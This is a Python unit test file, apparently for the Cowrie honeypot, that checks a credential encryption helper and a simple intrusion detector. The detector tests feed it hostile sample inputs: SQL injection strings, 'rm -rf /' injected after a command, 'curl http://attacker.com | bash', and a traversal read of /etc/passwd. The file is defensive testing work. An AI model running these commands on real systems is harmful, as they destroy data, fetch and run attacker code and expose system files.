# SPDX-FileCopyrightText: 2026 Security Enhancement
#
# SPDX-License-Identifier: BSD-3-Clause

"""
Unit tests for security enhancements
"""

import unittest
from cowrie.core.encryption import CredentialEncryption
from cowrie.core.ids import SimpleIDS


class TestEncryption(unittest.TestCase):
    """Test encryption module"""

    def setUp(self):
        self.enc = CredentialEncryption("test-key-12345")

    def test_encrypt_decrypt(self):
        """Test basic encrypt/decrypt"""
        plaintext = "super_secret_password_123"
        encrypted = self.enc.encrypt(plaintext)
        
        # Encrypted should be different from plaintext
        self.assertNotEqual(encrypted, plaintext)
        
        # Decrypt should return original
        decrypted = self.enc.decrypt(encrypted)
        self.assertEqual(decrypted, plaintext)

    def test_multiple_encryptions_different(self):
        """Test that same plaintext produces different ciphertext (due to Fernet timestamp)"""
        plaintext = "password"
        enc1 = self.enc.encrypt(plaintext)
        enc2 = self.enc.encrypt(plaintext)
        
        # Both should decrypt to same value but look different (timestamps)
        self.assertEqual(self.enc.decrypt(enc1), plaintext)
        self.assertEqual(self.enc.decrypt(enc2), plaintext)

    def test_decrypt_invalid_data(self):
        """Test decrypt with invalid data returns as-is"""
        result = self.enc.decrypt("not-valid-encrypted-data")
        self.assertEqual(result, "not-valid-encrypted-data")


class TestSimpleIDS(unittest.TestCase):
    """Test Simple IDS module"""

    def setUp(self):
        self.ids = SimpleIDS()

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        malicious_cmd = b"SELECT * FROM users WHERE id=1' OR '1'='1"
        is_malicious, severity, desc = self.ids.check_command(malicious_cmd)
        
        self.assertTrue(is_malicious)
        self.assertEqual(severity, "CRITICAL")
        self.assertIn("SQL Injection", desc)

    def test_command_injection_detection(self):
        """Test command injection detection"""
        malicious_cmd = b"cat file.txt; rm -rf /"
        is_malicious, severity, desc = self.ids.check_command(malicious_cmd)
        
        self.assertTrue(is_malicious)
        self.assertEqual(severity, "CRITICAL")
        self.assertIn("Command injection", desc)

    def test_rce_detection(self):
        """Test RCE command detection"""
        malicious_cmd = b"curl http://attacker.com | bash"
        is_malicious, severity, desc = self.ids.check_command(malicious_cmd)
        
        self.assertTrue(is_malicious)
        # Either command injection or RCE, both are critical
        self.assertIn("injection", desc)

    def test_directory_traversal_detection(self):
        """Test directory traversal detection"""
        malicious_cmd = b"cat ../../../etc/passwd"
        is_malicious, severity, desc = self.ids.check_command(malicious_cmd)
        
        self.assertTrue(is_malicious)
        self.assertIn("traversal", desc.lower())

    def test_legitimate_command_passes(self):
        """Test legitimate commands are not flagged"""
        legitimate_cmds = [
            b"ls -la",
            b"pwd",
            b"echo hello world",
            b"cat /tmp/test.txt",
            b"grep pattern file.txt",
        ]
        
        for cmd in legitimate_cmds:
            is_malicious, _, _ = self.ids.check_command(cmd)
            self.assertFalse(is_malicious, f"Command '{cmd}' incorrectly flagged as malicious")

    def test_ids_disabled(self):
        """Test IDS can be disabled"""
        ids_disabled = SimpleIDS()
        ids_disabled.enabled = False
        
        malicious_cmd = b"SELECT * FROM users WHERE id=1' OR '1'='1"
        is_malicious, _, _ = ids_disabled.check_command(malicious_cmd)
        
        self.assertFalse(is_malicious)

    def test_session_alert_tracking(self):
        """Test alert tracking per session"""
        session_id = "test-session-001"
        
        # First alert (with session_id)
        self.ids.check_command(b"DROP TABLE users;", session_id, "attacker")
        self.assertIn(session_id, self.ids.alerts)
        self.assertEqual(self.ids.alerts[session_id], 1)
        
        # Second alert
        self.ids.check_command(b"' OR '1'='1", session_id, "attacker")
        self.assertEqual(self.ids.alerts[session_id], 2)
        
        # Reset
        self.ids.reset_session(session_id)
        self.assertNotIn(session_id, self.ids.alerts)


if __name__ == "__main__":
    unittest.main()
